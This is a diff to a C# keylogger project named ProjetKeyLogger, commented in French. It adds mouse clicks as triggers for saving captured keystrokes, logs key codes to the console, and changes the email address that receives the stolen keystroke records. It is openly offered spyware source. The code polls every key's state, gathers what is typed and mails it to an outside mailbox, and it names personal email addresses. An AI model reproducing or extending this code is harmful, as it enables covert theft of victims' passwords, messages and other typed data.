@@ -73,19 +73,22 @@ namespace ProjetKeyLogger
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    
 
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
+                        Console.WriteLine(codeASCII);
+
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
                         string valeurs;
                         switch (codeASCII)
                         {
-                            //Si touche Entrée
+                            //Si touche Entrée ou clic droit ou gauche
+                            case 1:
+                            case 2:
                             case 13:
                                 //On ajoute l'enregistrement a la collection
                                 collection_enregistrement.ajouterNew(enregistrement);
@@ -410,7 +413,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            message_mail.To.Add("ccamenen@outlook.fr");
+            message_mail.To.Add("camenenlythiery@gmail.com");
 
             //defition de l'objet du mail
             message_mail.Subject = objet_mail;
